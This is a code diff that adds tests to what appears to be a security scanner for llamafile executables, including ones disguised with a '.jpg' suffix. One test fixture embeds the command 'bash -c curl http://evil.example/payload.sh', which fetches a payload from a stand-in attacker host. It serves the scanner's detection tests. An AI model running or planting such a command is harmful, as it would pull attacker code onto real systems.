@@ -1721,8 +1721,33 @@ def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> 
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
 
+def test_scan_file_detects_malicious_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
+    disguised_llamafile = tmp_path / "payload.jpg"
+    disguised_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    result = scan_file(str(disguised_llamafile))
+
+    assert result.scanner_name == "llamafile"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
 def test_scan_file_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
     generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    result = scan_file(str(generic_executable))
+
+    assert result.scanner_name == "unknown"
+    assert result.issues == []
+
+
+def test_scan_file_does_not_route_misleading_suffix_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool.jpg"
     generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
 
     result = scan_file(str(generic_executable))
